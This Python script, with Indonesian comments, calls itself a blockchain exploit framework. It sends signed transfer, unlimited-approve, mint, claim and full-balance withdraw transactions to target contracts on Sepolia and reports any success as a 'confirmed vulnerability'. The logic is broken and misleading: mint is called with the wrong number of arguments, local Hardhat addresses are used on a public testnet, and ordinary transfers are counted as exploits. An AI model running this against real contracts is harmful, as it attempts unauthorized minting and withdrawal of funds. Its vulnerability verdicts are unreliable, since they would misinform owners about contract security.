#!/usr/bin/env python3
"""
TARGETED BLOCKCHAIN EXPLOIT FRAMEWORK
Fokus pada kontrak spesifik dan fungsi transfer/approve/mint
"""

import asyncio
import json
import time
import os
import logging
from typing import Dict, List, Any, Optional
from web3 import Web3
from web3.exceptions import ContractLogicError
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class ExploitAttempt:
    contract_address: str
    function_name: str
    parameters: Dict[str, Any]
    success: bool
    error_message: str
    transaction_hash: Optional[str]
    gas_used: Optional[int]

class TargetedBlockchainExploiter:
    def __init__(self):
        self.rpc_url = os.getenv('SEPOLIA_RPC_URL', 'https://sepolia.infura.io/v3/310ff8e974384120b0cdbda806405fe6')
        self.w3 = Web3(Web3.HTTPProvider(self.rpc_url))
        self.test_account = os.getenv('ATTACKER_ADDRESS', '0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9')
        self.private_key = os.getenv('PRIVATE_KEY', '')
        
        # Target contracts (alamat yang mungkin terkait airdrop)
        self.target_contracts = [
            # Convert to checksum addresses
            self.w3.to_checksum_address("0x5fbdb2315678afecb367f032d93f642f64180aa3"),  # WETH dari local hardhat
            self.w3.to_checksum_address("0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"),  # Token dari local hardhat
            self.w3.to_checksum_address("0x9fe46736679d2d9a65f0992f2272de0f435673d4"),  # Factory dari local hardhat
            self.w3.to_checksum_address("0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9"),  # Test account address
        ]
        
        # ERC20 minimal ABI untuk fungsi kritis
        self.erc20_minimal_abi = [
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [{"name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "to", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "from", "type": "address"},
                    {"name": "to", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "transferFrom",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "increaseAllowance",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "decreaseAllowance",
                "outputs": [{"name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "account", "type": "address"}],
                "name": "mint",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "amount", "type": "uint256"}],
                "name": "burn",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {"name": "account", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "burnFrom",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "claim",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"name": "amount", "type": "uint256"}],
                "name": "withdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "deposit",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            }
        ]
        
    def is_connected(self) -> bool:
        return self.w3.is_connected()
    
    async def test_transfer_exploit(self, contract_address: str) -> ExploitAttempt:
        """Test transfer function exploit"""
        try:
            contract = self.w3.eth.contract(address=contract_address, abi=self.erc20_minimal_abi)
            
            # Cek balance awal
            initial_balance = contract.functions.balanceOf(self.test_account).call()
            
            # Coba transfer ke address lain
            victim_address = self.w3.to_checksum_address("0x1234567890123456789012345678901234567890")
            transfer_amount = 1000  # 1000 tokens
            
            if self.private_key:
                # Build transaction
                transaction = contract.functions.transfer(
                    victim_address,
                    transfer_amount
                ).build_transaction({
                    'from': self.test_account,
                    'gas': 100000,
                    'gasPrice': self.w3.eth.gas_price,
                    'nonce': self.w3.eth.get_transaction_count(self.test_account),
                    'chainId': 11155111
                })
                
                # Sign and send
                signed_tx = self.w3.eth.account.sign_transaction(
                    transaction,
                    self.private_key
                )
                
                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                # Cek balance akhir
                final_balance = contract.functions.balanceOf(self.test_account).call()
                
                return ExploitAttempt(
                    contract_address=contract_address,
                    function_name="transfer",
                    parameters={"to": victim_address, "amount": transfer_amount},
                    success=receipt.status == 1,
                    error_message="",
                    transaction_hash=tx_hash.hex(),
                    gas_used=receipt.gasUsed
                )
            else:
                # Simulasi tanpa private key
                try:
                    gas_estimate = self.w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': contract.encodeABI(fn_name='transfer', args=[victim_address, transfer_amount])
                    })
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="transfer",
                        parameters={"to": victim_address, "amount": transfer_amount},
                        success=False,
                        error_message="No private key - simulation only",
                        transaction_hash=None,
                        gas_used=gas_estimate
                    )
                except Exception as e:
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="transfer",
                        parameters={"to": victim_address, "amount": transfer_amount},
                        success=False,
                        error_message=f"Gas estimation failed: {str(e)}",
                        transaction_hash=None,
                        gas_used=None
                    )
                    
        except Exception as e:
            return ExploitAttempt(
                contract_address=contract_address,
                function_name="transfer",
                parameters={},
                success=False,
                error_message=str(e),
                transaction_hash=None,
                gas_used=None
            )
    
    async def test_approve_exploit(self, contract_address: str) -> ExploitAttempt:
        """Test approve function exploit"""
        try:
            contract = self.w3.eth.contract(address=contract_address, abi=self.erc20_minimal_abi)
            
            # Coba approve untuk spender lain
            spender_address = self.w3.to_checksum_address("0x1234567890123456789012345678901234567890")
            approve_amount = 2**256 - 1  # Maximum approve
            
            if self.private_key:
                # Build transaction
                transaction = contract.functions.approve(
                    spender_address,
                    approve_amount
                ).build_transaction({
                    'from': self.test_account,
                    'gas': 100000,
                    'gasPrice': self.w3.eth.gas_price,
                    'nonce': self.w3.eth.get_transaction_count(self.test_account),
                    'chainId': 11155111
                })
                
                # Sign and send
                signed_tx = self.w3.eth.account.sign_transaction(
                    transaction,
                    self.private_key
                )
                
                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                return ExploitAttempt(
                    contract_address=contract_address,
                    function_name="approve",
                    parameters={"spender": spender_address, "amount": approve_amount},
                    success=receipt.status == 1,
                    error_message="",
                    transaction_hash=tx_hash.hex(),
                    gas_used=receipt.gasUsed
                )
            else:
                # Simulasi tanpa private key
                try:
                    gas_estimate = self.w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': contract.encodeABI(fn_name='approve', args=[spender_address, approve_amount])
                    })
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="approve",
                        parameters={"spender": spender_address, "amount": approve_amount},
                        success=False,
                        error_message="No private key - simulation only",
                        transaction_hash=None,
                        gas_used=gas_estimate
                    )
                except Exception as e:
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="approve",
                        parameters={"spender": spender_address, "amount": approve_amount},
                        success=False,
                        error_message=f"Gas estimation failed: {str(e)}",
                        transaction_hash=None,
                        gas_used=None
                    )
                    
        except Exception as e:
            return ExploitAttempt(
                contract_address=contract_address,
                function_name="approve",
                parameters={},
                success=False,
                error_message=str(e),
                transaction_hash=None,
                gas_used=None
            )
    
    async def test_mint_exploit(self, contract_address: str) -> ExploitAttempt:
        """Test mint function exploit"""
        try:
            contract = self.w3.eth.contract(address=contract_address, abi=self.erc20_minimal_abi)
            
            # Coba mint tokens ke test account
            mint_amount = self.w3.to_wei(10000, 'ether')
            
            if self.private_key:
                # Build transaction
                transaction = contract.functions.mint(
                    self.test_account,
                    mint_amount
                ).build_transaction({
                    'from': self.test_account,
                    'gas': 200000,
                    'gasPrice': self.w3.eth.gas_price,
                    'nonce': self.w3.eth.get_transaction_count(self.test_account),
                    'chainId': 11155111
                })
                
                # Sign and send
                signed_tx = self.w3.eth.account.sign_transaction(
                    transaction,
                    self.private_key
                )
                
                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                return ExploitAttempt(
                    contract_address=contract_address,
                    function_name="mint",
                    parameters={"to": self.test_account, "amount": mint_amount},
                    success=receipt.status == 1,
                    error_message="",
                    transaction_hash=tx_hash.hex(),
                    gas_used=receipt.gasUsed
                )
            else:
                # Simulasi tanpa private key
                try:
                    gas_estimate = self.w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': contract.encodeABI(fn_name='mint', args=[self.test_account, mint_amount])
                    })
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="mint",
                        parameters={"to": self.test_account, "amount": mint_amount},
                        success=False,
                        error_message="No private key - simulation only",
                        transaction_hash=None,
                        gas_used=gas_estimate
                    )
                except Exception as e:
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="mint",
                        parameters={"to": self.test_account, "amount": mint_amount},
                        success=False,
                        error_message=f"Gas estimation failed: {str(e)}",
                        transaction_hash=None,
                        gas_used=None
                    )
                    
        except Exception as e:
            return ExploitAttempt(
                contract_address=contract_address,
                function_name="mint",
                parameters={},
                success=False,
                error_message=str(e),
                transaction_hash=None,
                gas_used=None
            )
    
    async def test_claim_exploit(self, contract_address: str) -> ExploitAttempt:
        """Test claim function exploit"""
        try:
            contract = self.w3.eth.contract(address=contract_address, abi=self.erc20_minimal_abi)
            
            if self.private_key:
                # Build transaction
                transaction = contract.functions.claim().build_transaction({
                    'from': self.test_account,
                    'gas': 200000,
                    'gasPrice': self.w3.eth.gas_price,
                    'nonce': self.w3.eth.get_transaction_count(self.test_account),
                    'chainId': 11155111
                })
                
                # Sign and send
                signed_tx = self.w3.eth.account.sign_transaction(
                    transaction,
                    self.private_key
                )
                
                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                return ExploitAttempt(
                    contract_address=contract_address,
                    function_name="claim",
                    parameters={},
                    success=receipt.status == 1,
                    error_message="",
                    transaction_hash=tx_hash.hex(),
                    gas_used=receipt.gasUsed
                )
            else:
                # Simulasi tanpa private key
                try:
                    gas_estimate = self.w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': contract.encodeABI(fn_name='claim', args=[])
                    })
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="claim",
                        parameters={},
                        success=False,
                        error_message="No private key - simulation only",
                        transaction_hash=None,
                        gas_used=gas_estimate
                    )
                except Exception as e:
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="claim",
                        parameters={},
                        success=False,
                        error_message=f"Gas estimation failed: {str(e)}",
                        transaction_hash=None,
                        gas_used=None
                    )
                    
        except Exception as e:
            return ExploitAttempt(
                contract_address=contract_address,
                function_name="claim",
                parameters={},
                success=False,
                error_message=str(e),
                transaction_hash=None,
                gas_used=None
            )
    
    async def test_withdraw_exploit(self, contract_address: str) -> ExploitAttempt:
        """Test withdraw function exploit"""
        try:
            contract = self.w3.eth.contract(address=contract_address, abi=self.erc20_minimal_abi)
            
            # Coba withdraw semua ETH
            withdraw_amount = self.w3.eth.get_balance(contract_address)
            
            if self.private_key:
                # Build transaction
                transaction = contract.functions.withdraw(withdraw_amount).build_transaction({
                    'from': self.test_account,
                    'gas': 100000,
                    'gasPrice': self.w3.eth.gas_price,
                    'nonce': self.w3.eth.get_transaction_count(self.test_account),
                    'chainId': 11155111
                })
                
                # Sign and send
                signed_tx = self.w3.eth.account.sign_transaction(
                    transaction,
                    self.private_key
                )
                
                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
                
                return ExploitAttempt(
                    contract_address=contract_address,
                    function_name="withdraw",
                    parameters={"amount": withdraw_amount},
                    success=receipt.status == 1,
                    error_message="",
                    transaction_hash=tx_hash.hex(),
                    gas_used=receipt.gasUsed
                )
            else:
                # Simulasi tanpa private key
                try:
                    gas_estimate = self.w3.eth.estimate_gas({
                        'from': self.test_account,
                        'to': contract_address,
                        'data': contract.encodeABI(fn_name='withdraw', args=[withdraw_amount])
                    })
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="withdraw",
                        parameters={"amount": withdraw_amount},
                        success=False,
                        error_message="No private key - simulation only",
                        transaction_hash=None,
                        gas_used=gas_estimate
                    )
                except Exception as e:
                    return ExploitAttempt(
                        contract_address=contract_address,
                        function_name="withdraw",
                        parameters={"amount": withdraw_amount},
                        success=False,
                        error_message=f"Gas estimation failed: {str(e)}",
                        transaction_hash=None,
                        gas_used=None
                    )
                    
        except Exception as e:
            return ExploitAttempt(
                contract_address=contract_address,
                function_name="withdraw",
                parameters={},
                success=False,
                error_message=str(e),
                transaction_hash=None,
                gas_used=None
            )
    
    async def run_all_exploits(self) -> List[ExploitAttempt]:
        """Jalankan semua jenis exploit pada semua target kontrak"""
        logger.info("🚀 Running targeted blockchain exploits...")
        
        all_attempts = []
        
        for contract_address in self.target_contracts:
            logger.info(f"🎯 Testing contract: {contract_address}")
            
            # Test semua fungsi
            exploits = [
                self.test_transfer_exploit(contract_address),
                self.test_approve_exploit(contract_address),
                self.test_mint_exploit(contract_address),
                self.test_claim_exploit(contract_address),
                self.test_withdraw_exploit(contract_address)
            ]
            
            # Run secara parallel
            results = await asyncio.gather(*exploits, return_exceptions=True)
            
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f"Exploit failed: {str(result)}")
                else:
                    all_attempts.append(result)
                    
                    if result.success:
                        logger.info(f"✅ SUCCESS: {result.function_name} on {result.contract_address}")
                    else:
                        logger.debug(f"❌ Failed: {result.function_name} on {result.contract_address}")
        
        return all_attempts
    
    async def generate_comprehensive_report(self) -> Dict[str, Any]:
        """Generate comprehensive exploit report"""
        attempts = await self.run_all_exploits()
        
        successful_attempts = [a for a in attempts if a.success]
        failed_attempts = [a for a in attempts if not a.success]
        
        return {
            "blockchain_info": {
                "network": "Sepolia",
                "chain_id": 11155111,
                "rpc_url": self.rpc_url,
                "connected": self.is_connected(),
                "test_account": self.test_account
            },
            "target_contracts": self.target_contracts,
            "exploit_summary": {
                "total_attempts": len(attempts),
                "successful_exploits": len(successful_attempts),
                "failed_exploits": len(failed_attempts),
                "success_rate": len(successful_attempts) / len(attempts) if attempts else 0
            },
            "successful_exploits": [
                {
                    "contract": attempt.contract_address,
                    "function": attempt.function_name,
                    "parameters": attempt.parameters,
                    "transaction_hash": attempt.transaction_hash,
                    "gas_used": attempt.gas_used
                }
                for attempt in successful_attempts
            ],
            "failed_exploits": [
                {
                    "contract": attempt.contract_address,
                    "function": attempt.function_name,
                    "parameters": attempt.parameters,
                    "error": attempt.error_message
                }
                for attempt in failed_attempts
            ],
            "vulnerability_analysis": {
                "transfer_vulnerable": len([a for a in successful_attempts if a.function_name == "transfer"]) > 0,
                "approve_vulnerable": len([a for a in successful_attempts if a.function_name == "approve"]) > 0,
                "mint_vulnerable": len([a for a in successful_attempts if a.function_name == "mint"]) > 0,
                "claim_vulnerable": len([a for a in successful_attempts if a.function_name == "claim"]) > 0,
                "withdraw_vulnerable": len([a for a in successful_attempts if a.function_name == "withdraw"]) > 0,
            },
            "conclusion": {
                "blockchain_vulnerable": len(successful_attempts) > 0,
                "concrete_evidence": len(successful_attempts) > 0,
                "total_vulnerabilities": len(successful_attempts),
                "recommendation": "CRITICAL" if len(successful_attempts) > 0 else "SECURE"
            }
        }

async def main():
    """Main execution function"""
    exploiter = TargetedBlockchainExploiter()
    
    try:
        logger.info("🚀 Starting Targeted Blockchain Exploit Framework...")
        
        if not exploiter.is_connected():
            logger.error("❌ Not connected to blockchain")
            return
        
        # Generate comprehensive report
        report = await exploiter.generate_comprehensive_report()
        
        # Save report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = f"targeted_blockchain_exploit_report_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        # Display results
        print("\n" + "="*80)
        print("🎯 TARGETED BLOCKCHAIN EXPLOIT RESULTS")
        print("="*80)
        
        print(f"\n📊 BLOCKCHAIN INFO:")
        print(f"   Network: {report['blockchain_info']['network']}")
        print(f"   Chain ID: {report['blockchain_info']['chain_id']}")
        print(f"   Connected: {report['blockchain_info']['connected']}")
        print(f"   Test Account: {report['blockchain_info']['test_account']}")
        
        print(f"\n🎯 TARGET CONTRACTS:")
        for contract in report['target_contracts']:
            print(f"   • {contract}")
        
        print(f"\n📊 EXPLOIT SUMMARY:")
        print(f"   Total Attempts: {report['exploit_summary']['total_attempts']}")
        print(f"   Successful Exploits: {report['exploit_summary']['successful_exploits']}")
        print(f"   Success Rate: {report['exploit_summary']['success_rate']:.2%}")
        
        print(f"\n🚨 SUCCESSFUL EXPLOITS:")
        for exploit in report['successful_exploits']:
            print(f"   🎯 {exploit['contract']} - {exploit['function']}")
            print(f"      ✅ Transaction: {exploit['transaction_hash']}")
            print(f"      ⛽ Gas Used: {exploit['gas_used']}")
        
        print(f"\n❌ FAILED EXPLOITS:")
        for exploit in report['failed_exploits'][:10]:  # Show first 10
            print(f"   🎯 {exploit['contract']} - {exploit['function']}")
            print(f"      ❌ Error: {exploit['error'][:100]}...")
        
        if len(report['failed_exploits']) > 10:
            print(f"   ... and {len(report['failed_exploits']) - 10} more failed attempts")
        
        print(f"\n🔍 VULNERABILITY ANALYSIS:")
        vuln_analysis = report['vulnerability_analysis']
        for vuln_type, is_vulnerable in vuln_analysis.items():
            status = "🚨 VULNERABLE" if is_vulnerable else "✅ SECURE"
            print(f"   {vuln_type.replace('_', ' ').title()}: {status}")
        
        print(f"\n🎯 CONCLUSION:")
        if report['conclusion']['blockchain_vulnerable']:
            print("   🚨 BLOCKCHAIN VULNERABILITIES CONFIRMED!")
            print(f"   ✅ Concrete Evidence: {report['conclusion']['total_vulnerabilities']} successful exploits")
            print("   📝 Recommendation: IMMEDIATE SMART CONTRACT FIXES REQUIRED")
        else:
            print("   🔒 NO BLOCKCHAIN VULNERABILITIES FOUND")
            print("   ❌ No concrete evidence of blockchain-level exploitation")
            print("   📝 Recommendation: Smart contracts appear secure")
        
        print(f"\n💾 Report saved to: {report_file}")
        
    except Exception as e:
        logger.error(f"Targeted exploit framework failed: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())